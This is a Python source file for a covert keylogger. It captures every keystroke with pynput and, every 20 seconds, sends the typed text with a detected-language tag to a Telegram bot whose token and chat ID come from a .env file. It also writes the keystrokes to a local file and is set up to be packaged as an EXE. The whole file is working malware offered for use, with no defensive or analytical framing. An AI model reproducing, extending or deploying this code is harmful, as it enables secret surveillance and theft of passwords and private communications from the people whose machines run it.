import sys
import os
import time
import threading
import telebot
from pynput import keyboard
from langdetect import detect  # For language detection
from dotenv import load_dotenv  # To load environment variables

# Load environment variables from .env file
load_dotenv()

# Get the directory path where the EXE or script is located
if getattr(sys, 'frozen', False):
    # If the app is running as an EXE
    application_path = sys._MEIPASS
else:
    # If running as a Python script
    application_path = os.path.dirname(os.path.abspath(__file__))

# Path to keyfile.txt, which will be created next to the EXE or script
keyfile_path = os.path.join(application_path, "keyfile.txt")

# String to store pressed keys
key_data = ""

# Function to record pressed keys
def keyPressed(key):
    global key_data
    try:
        # Check if the character is not None
        char = key.char
        if char is not None:
            key_data += char
    except AttributeError:
        if key == keyboard.Key.space:
            key_data += ' '  # Space
        elif key == keyboard.Key.enter:
            key_data += '\n'  # New line
        elif key == keyboard.Key.tab:
            key_data += '\t'  # Tab
        elif key in {keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.shift}:
            key_data += f'[{key}]'  # Account for special keys
        else:
            key_data += f'[{key}]'  # Record other special keys

# Function to save data to a file every 5 seconds and send a new Telegram message
def save_data():
    global key_data
    bot = telebot.TeleBot(os.getenv('BOT_TOKEN'))  # Get bot token from .env
    chat_id = os.getenv('CHAT_ID')  # Get chat ID from .env

    # Send initial message about the start of the program
    bot.send_message(chat_id, "<b>Program started. Nothing typed.\n\n\n❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️"
                              "️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤"
                              "️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤"
                              "️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤"
                              "️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤"
                              "️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤"
                              "️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤"
                              "❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️️</b>", parse_mode="HTML")

    while True:
        try:
            if key_data:
                # Detect the language of the text
                try:
                    language = detect(key_data)
                except Exception:
                    language = "unknown"

                # Message about the detected language
                language_message = f"Language: {language}"

                # Send a new message with the text
                bot.send_message(chat_id, f"Program started.\n{language_message}\n" + key_data)

                # Save the data to the file
                with open(keyfile_path, 'a') as logKey:
                    logKey.write(key_data)

                # Clear the stored key data after sending
                key_data = ""

            time.sleep(20)  # Delay of 60 seconds
        except Exception as e:
            bot.send_message(chat_id, f"Error: {e}") # Catch error

# Clear the file at the start of the program
if os.path.exists(keyfile_path):
    with open(keyfile_path, 'w') as logKey:
        logKey.truncate(0)  # Clear the file

# Check if the file exists and read its content
if os.path.exists(keyfile_path):
    with open(keyfile_path, 'r') as logKey:
        text_form_doc = logKey.read()
else:
    text_form_doc = ""

# If the file is not empty, send its content, otherwise inform about the emptiness
if text_form_doc:
    bot = telebot.TeleBot(os.getenv('BOT_TOKEN'))  # Get bot token from .env
    chat_id = os.getenv('CHAT_ID')  # Get chat ID from .env
    language = detect(text_form_doc)  # Detect the language of the text
    bot.send_message(chat_id, f"Program started.\nLanguage: {language}\n" + text_form_doc)

# Start saving data in a separate thread
save_thread = threading.Thread(target=save_data, daemon=True)
save_thread.start()

# Start the key listener
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()
